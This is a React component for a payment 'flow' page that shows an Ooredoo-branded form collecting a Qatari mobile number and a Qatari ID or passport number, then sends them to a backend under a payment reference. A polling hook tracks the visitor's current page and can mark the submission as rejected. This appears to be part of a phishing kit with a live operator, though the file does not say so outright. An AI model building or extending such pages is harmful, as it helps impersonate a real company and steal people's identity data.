import { useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { paymentsApi } from "../../api/payments";
import { useFlowPoll } from "../../hooks/useFlowPoll";
import { useLang } from "../../context/LanguageContext";
import { FlowHeader } from "./FlowHeader";
import { FlowLoading } from "./FlowLoading";
import styles from "./FlowRegisterPage.module.scss";

export function FlowRegisterPage() {
  const location = useLocation();
  const navigate = useNavigate();
  const { t, dir } = useLang();
  const ft = t.flow;
  const fr = ft.register;

  const state = location.state as { reference?: string } | null;
  const reference = state?.reference ?? sessionStorage.getItem("pay_ref") ?? "";

  const [mobile, setMobile] = useState("");
  const [qid, setQid] = useState("");
  const [submitted, setSubmitted] = useState(false);
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState("");

  useFlowPoll({
    reference,
    currentPage: "register",
    enabled: !!reference,
    onReset: () => {
      setSubmitted((prev) => {
        if (prev) setError(fr.rejected);
        return false;
      });
    },
  });

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!mobile.trim() || !qid.trim()) { setError(fr.fillAll); return; }
    setBusy(true);
    setError("");
    try {
      await paymentsApi.flowStep(reference, "register_submitted", {
        mobile: mobile.trim(),
        qatari_id_or_passport: qid.trim(),
      });
      setSubmitted(true);
    } catch {
      setError(ft.networkError);
    } finally {
      setBusy(false);
    }
  };

  if (!reference) { navigate("/", { replace: true }); return null; }

  return (
    <div className={styles.container} dir={dir}>
      <FlowHeader />

      {/* Header */}
      <header className={styles.header}>
        <div className={styles.headerContent}>
          <button type="button" onClick={() => navigate("/flow/login", { state: { reference } })} className={styles.closeBtn} aria-label="Close">
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth="2" stroke="currentColor" style={{ width: 24, height: 24 }}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
            </svg>
          </button>
          <h1 className={styles.headerTitle}>{fr.headerTitle}</h1>
        </div>
        <div className={styles.progressBarContainer}>
          <div className={styles.progressBarBg}>
            <div className={styles.progressBarFill} />
          </div>
          <div className={styles.stepIndicator}>
            <span>{fr.step}</span>
            <span>{fr.stepTotal}</span>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className={styles.main}>
        <div className={styles.contentWrapper}>
          <div className={styles.welcomeSection}>
            <h2 className={styles.welcomeTitle}>
              {fr.welcomeTitle}
              <span className={styles.ooredooText}> Ooredoo</span>
              {" "}<span role="img" aria-label="wave">👋</span>
            </h2>
            <p className={styles.welcomeDesc}>{fr.welcomeDesc}</p>
          </div>

          {error && <div className={styles.errorBox}>{error}</div>}

          <form onSubmit={handleSubmit} className={styles.form}>
            <div className={styles.phoneField}>
              <div className={styles.phoneCodeContainer}>
                <span className={styles.flag} aria-hidden="true">🇶🇦</span>
                <span>974</span>
              </div>
              <input
                type="tel"
                name="mobile"
                inputMode="numeric"
                placeholder={fr.mobilePlaceholder}
                value={mobile}
                onChange={(e) => setMobile(e.target.value.replace(/\D/g, ""))}
                className={styles.phoneInput}
              />
            </div>

            <input
              type="text"
              name="qatari_id_or_passport"
              placeholder={fr.qidPlaceholder}
              value={qid}
              onChange={(e) => setQid(e.target.value)}
              className={styles.idInput}
            />

            <button type="submit" disabled={busy} className={styles.submitBtn}>
              {fr.submit}
            </button>
          </form>
        </div>
      </main>

      {submitted && <FlowLoading />}
    </div>
  );
}
